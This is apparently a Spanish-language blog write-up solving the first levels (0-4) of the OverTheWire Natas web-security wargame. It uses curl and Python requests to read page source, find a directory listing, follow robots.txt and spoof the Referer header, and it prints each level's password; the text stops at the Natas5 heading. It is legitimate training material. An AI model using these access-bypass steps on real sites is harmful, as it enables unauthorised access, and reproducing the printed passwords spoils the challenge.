
Natas son retos de pentesting web de "Over-The-Wire". Yo voy a realizar los ejercicios usando scripting en python y bash
Para resolver la pagina hay que encontrar la contraseña para autenticarse en el nivel siguiente con el usuario llamado igual que en nivel actual.

## (Natas0)[http://natas0.natas.labs.overthewire.org]

*Vulnerabilidad: credenciales en el codigo fuente*

El nivel inicial, esconde la credencial en el código fuente. (clic derecho)
Con scripting se puede ver muy facilmente
```python
import requests
url = "http://natas0.natas.labs.overthewire.org/"
req = requests.get(url, auth=("natas0","natas0"), verify=False)
print(req.text)
```
Desde consola tambien es pan comido
```console
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas0.natas.labs.overthewire.org" -u natas0:natas0
... <!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
```
## (Natas1)[http://natas1.natas.labs.overthewire.org]

*Vulnerabilidad: credenciales en el codigo fuente*
*Restriccion: click derecho en el navegador*

El segundo nivel si visitas la web te dice que el click derecho esta prohibido. Nos autenticamos con la contraseña de antes.
Aunque se desactive dicho click en el navegador, con curl o python se puede acceder igualmente al codigo fuente
```console
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas1.natas.labs.overthewire.org" -u natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto
... <!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
```

## (Natas2)[http://natas2.natas.labs.overthewire.org]

*Vulnerabilidad: directory liting*

En la web aparentemente no hay nada y en el codigo fuente de natas2 no sale la contraseña, pero si sale un "img src" o sea una ruta de donde saca una foto.
```console
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas2.natas.labs.overthewire.org" -u natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
... <img src="files/pixel.png">
```
Si ponemos en el nevegador la ruta ```"http://natas2.natas.labs.overthewire.org/files"``` tenemos un directory listing, es decir una lista de todos los 
elementos que estan bajo dicha ruta, (entre ellas la foto de pixel.png) pero tambien un archivo de texto "users.txt" con la contraseña.

## (Natas3)[http://natas3.natas.labs.overthewire.org]

*Vulnerabilidad: rutas criticas en el robots.txt*

Otro "no hay nada en esta web" en el navegador
```console
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas3.natas.labs.overthewire.org" -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 
<!-- No more information leaks!! Not even Google will find it this time... -->
```
Nos dice que no va a haber mas crendeciales filtradas, y que ni siquiera Google nos encontrará. Eso ultimo es una pista hacia la ruta "robots.txt"
la cual evita que Google indexe/encuentre ciertas rutas sensibles.
```console
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas3.natas.labs.overthewire.org/robots.txt" -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 
User-agent: *
Disallow: /s3cr3t/
```
Dicho "/s3cr3t" nos lleva a otro users.txt con las credenciales

## (Natas4)[http://natas4.natas.labs.overthewire.org]

*Restriccion: referrer limitado*

Este nivel nos dice que solo acepta a gente que venga desde ```http://natas5.natas.labs.overthewire.org/```, es decir que desde esa página hayan pinchado en un link para venir a la actual. Esto se llama referrer. Con curl se puede esècificar dicho referrer con "-e"
```console
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas4.natas.labs.overthewire.org" -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ \
> -e http://natas5.natas.labs.overthewire.org/
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```
## (Natas5)[http://natas5.natas.labs.overthewire.org]







